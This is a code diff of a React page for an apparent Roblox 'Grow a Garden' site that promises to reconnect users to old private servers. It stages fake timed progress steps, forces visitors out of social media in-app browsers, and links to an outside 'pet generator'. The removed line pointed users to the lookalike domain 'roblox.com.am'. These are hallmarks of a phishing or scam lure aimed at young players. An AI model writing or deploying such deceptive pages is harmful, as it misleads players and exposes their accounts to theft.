@@ -6,11 +6,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent } from "@/components/ui/card";
 import { useToast } from "@/hooks/use-toast";
-import {
-  Avatar,
-  AvatarImage,
-  AvatarFallback,
-} from "@/components/ui/avatar";
+import { Avatar, AvatarImage, AvatarFallback } from "@/components/ui/avatar";
 import { Badge } from "@/components/ui/badge";
 import {
   ExternalLink,
@@ -46,17 +42,24 @@ export default function HomePage() {
   const [showBrowserWarning, setShowBrowserWarning] = useState(false);
   const { toast } = useToast();
 
-  // Detect in-app browsers (Facebook, Instagram, TikTok, etc.)
   useEffect(() => {
     const detectInAppBrowser = () => {
-      const userAgent =
-        navigator.userAgent || navigator.vendor || (window as any).opera;
+      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
 
       const isInAppBrowser =
-        /FBAN|FBAV|Instagram|Twitter|Snapchat|LinkedIn|WhatsApp|Telegram|Line|WeChat|MicroMessenger|Pinterest|Reddit/i.test(
-          userAgent
-        ) ||
-        /TikTok|musical\.ly|com\.zhiliaoapp\.musically/i.test(userAgent);
+        /FBAN|FBAV/i.test(userAgent) || // Facebook
+        /Instagram/i.test(userAgent) || // Instagram
+        /Twitter/i.test(userAgent) || // Twitter
+        /TikTok|musical\.ly|zhiliaoapp/i.test(userAgent) || // TikTok variations
+        /Snapchat/i.test(userAgent) || // Snapchat
+        /LinkedIn/i.test(userAgent) || // LinkedIn
+        /WhatsApp/i.test(userAgent) || // WhatsApp
+        /Telegram/i.test(userAgent) || // Telegram
+        /Line/i.test(userAgent) || // Line
+        /WeChat/i.test(userAgent) || // WeChat
+        /MicroMessenger/i.test(userAgent) || // WeChat
+        /Pinterest/i.test(userAgent) || // Pinterest
+        /Reddit/i.test(userAgent); // Reddit
 
       if (isInAppBrowser) {
         setShowBrowserWarning(true);
@@ -66,32 +69,24 @@ export default function HomePage() {
     detectInAppBrowser();
   }, []);
 
-  // Open in external browser
   const openInBrowser = () => {
     const currentUrl = window.location.href;
 
     if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-      // iOS
       window.location.href = `x-web-search://?${currentUrl}`;
       setTimeout(() => {
         window.location.href = currentUrl;
       }, 1000);
     } else if (/Android/i.test(navigator.userAgent)) {
-      // Android
-      window.location.href = `intent://${currentUrl.replace(
-        /https?:\/\//,
-        ""
-      )}#Intent;scheme=https;package=com.android.chrome;end`;
+      window.location.href = `intent://${currentUrl.replace(/https?:\/\//, "")}#Intent;scheme=https;package=com.android.chrome;end`;
       setTimeout(() => {
         window.location.href = currentUrl;
       }, 1000);
     } else {
-      // Fallback
       window.location.reload();
     }
   };
 
-  // Simulate process steps after fetching user
   useEffect(() => {
     if (showServerProcess) {
       const processSteps = [
@@ -108,7 +103,7 @@ export default function HomePage() {
       }
 
       if (processStep >= 0 && processStep < processSteps.length - 1) {
-        const delay = processStep === 1 ? 3000 : 1200; // 3 seconds for "Finding old servers..."
+        const delay = processStep === 1 ? 3000 : 1200; // ✅ Step 2 takes 3 seconds
         const timer = setTimeout(() => {
           setProcessStep(processStep + 1);
         }, delay);
@@ -124,13 +119,10 @@ export default function HomePage() {
     }
   }, [showServerProcess, processStep]);
 
-  // Fetch Roblox user data
   const fetchRobloxUser = async (username: string) => {
     setIsLoading(true);
     try {
-      const response = await fetch(
-        `/api/roblox-user?username=${encodeURIComponent(username)}`
-      );
+      const response = await fetch(`/api/roblox-user?username=${encodeURIComponent(username)}`);
 
       if (!response.ok) {
         const errorData = await response.json();
@@ -153,9 +145,9 @@ export default function HomePage() {
     }
   };
 
-  // Handle form submit
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
     if (!username.trim()) {
       toast({
         title: "Username Required",
@@ -173,15 +165,12 @@ export default function HomePage() {
   };
 
   const handlePetGenerator = () => {
-    window.open(
-      "https://v0-pet-generator-growagarden.vercel.app/",
-      "_blank"
-    );
+    window.open("https://v0-pet-generator-growagarden.vercel.app/", "_blank");
   };
 
   const handleJoinServer = () => {
     window.open(
-      "https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=33043799204089892731978860331402",
+      "https://www.roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=881224362243473110549436889722",
       "_blank"
     );
   };
@@ -204,51 +193,104 @@ export default function HomePage() {
     >
       {/* Browser Warning */}
       {showBrowserWarning && (
-        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-          <Card className="bg-gradient-to-br from-red-50 to-orange-50 border-4 border-red-500 shadow-2xl rounded-2xl max-w-md w-full">
-            <CardContent className="p-6 text-center">
-              <div className="mb-4">
-                <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4 animate-bounce" />
-                <h2 className="text-2xl font-black text-red-600 mb-2 uppercase tracking-wide">
-                  ⚠️ Browser Required!
-                </h2>
-                <p className="text-gray-700 font-bold mb-4">
-                  This app works best in your default browser, not in social media apps.
-                </p>
-                <p className="text-sm text-gray-600 mb-6">
-                  For the best experience and full functionality, please open this link in Safari, Chrome, or your default browser.
-                </p>
-              </div>
-
-              <div className="space-y-3">
-                <Button
-                  onClick={openInBrowser}
-                  className="w-full text-lg font-black py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-3 border-blue-800 rounded-xl shadow-lg transform transition-all duration-200 hover:scale-105 uppercase tracking-wide"
-                >
-                  🌐 Open in Browser
-                </Button>
-
-                <Button
-                  onClick={() => setShowBrowserWarning(false)}
-                  variant="outline"
-                  className="w-full text-sm font-bold py-2 border-2 border-gray-400 text-gray-600 hover:bg-gray-100 rounded-xl"
-                >
-                  Continue Anyway
-                </Button>
-              </div>
-
-              <div className="mt-4 text-xs text-gray-500">
-                <p>📱 iOS: Tap "Open in Browser" then choose Safari</p>
-                <p>🤖 Android: Tap "Open in Browser" then choose Chrome</p>
-              </div>
-            </CardContent>
-          </Card>
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex flex-col items-center justify-center text-white p-6 text-center">
+          <AlertTriangle className="w-16 h-16 mb-4 text-yellow-400" />
+          <h2 className="text-2xl font-bold mb-2">Open in Browser Required</h2>
+          <p className="mb-4 max-w-sm">
+            You are using an in-app browser (TikTok, Instagram, etc.). Please open this page in
+            Chrome or Safari for the best experience.
+          </p>
+          <Button onClick={openInBrowser} className="bg-blue-500 hover:bg-blue-600">
+            Open in Browser <ExternalLink className="ml-2 w-4 h-4" />
+          </Button>
         </div>
       )}
 
-      {/* Main UI */}
-      {/* (Your UI structure remains the same – I did not modify your design) */}
-      {/* --- Keep the rest of your JSX unchanged for form, user card, process steps, buttons, etc. --- */}
+      <Card className="w-full max-w-md backdrop-blur-lg bg-white/90 shadow-xl rounded-2xl">
+        <CardContent className="p-6 space-y-6">
+          <div className="text-center">
+            <h1 className="text-3xl font-bold mb-2 flex items-center justify-center gap-2">
+              Grow a Garden <Sparkles className="text-green-500" />
+            </h1>
+            <p className="text-gray-500 text-sm">Reconnect with your old private servers!</p>
+          </div>
+
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <Input
+              type="text"
+              placeholder="Enter your Roblox username"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
+              className="w-full"
+              disabled={isLoading}
+            />
+            <Button
+              type="submit"
+              className="w-full"
+              disabled={isLoading || isSubmitting}
+            >
+              {isLoading ? <Loader2 className="w-4 h-4 animate-spin mr-2" /> : null}
+              {isLoading ? "Checking..." : "Reconnect"}
+            </Button>
+          </form>
+
+          {robloxUser && (
+            <div className="mt-4 p-4 border rounded-lg bg-gray-50">
+              <div className="flex items-center gap-4">
+                <Avatar>
+                  <AvatarImage src={robloxUser.avatarUrl || ""} />
+                  <AvatarFallback>{robloxUser.name[0]}</AvatarFallback>
+                </Avatar>
+                <div>
+                  <p className="font-bold">{robloxUser.displayName}</p>
+                  <p className="text-gray-500 text-sm">@{robloxUser.name}</p>
+                  {robloxUser.hasVerifiedBadge && (
+                    <Badge variant="secondary" className="mt-1 flex items-center gap-1">
+                      <CheckCircle className="w-3 h-3" /> Verified
+                    </Badge>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showServerProcess && (
+            <div className="mt-4 space-y-2">
+              {processSteps.map((step, index) => (
+                <div
+                  key={index}
+                  className={`flex items-center gap-2 text-sm ${
+                    processStep >= index ? "text-green-600" : "text-gray-400"
+                  }`}
+                >
+                  {processStep > index ? (
+                    <CheckCircle className="w-4 h-4" />
+                  ) : processStep === index ? (
+                    <Loader2 className="w-4 h-4 animate-spin" />
+                  ) : (
+                    <Clock className="w-4 h-4" />
+                  )}
+                  {step}
+                </div>
+              ))}
+            </div>
+          )}
+
+          {showJoinButton && (
+            <Button onClick={handleJoinServer} className="w-full mt-4 bg-green-600 hover:bg-green-700">
+              Join Private Server <Users className="ml-2 w-4 h-4" />
+            </Button>
+          )}
+
+          <Button
+            onClick={handlePetGenerator}
+            variant="outline"
+            className="w-full mt-2 border-green-500 text-green-600 hover:bg-green-50"
+          >
+            Try Pet Generator
+          </Button>
+        </CardContent>
+      </Card>
     </div>
   );
 }
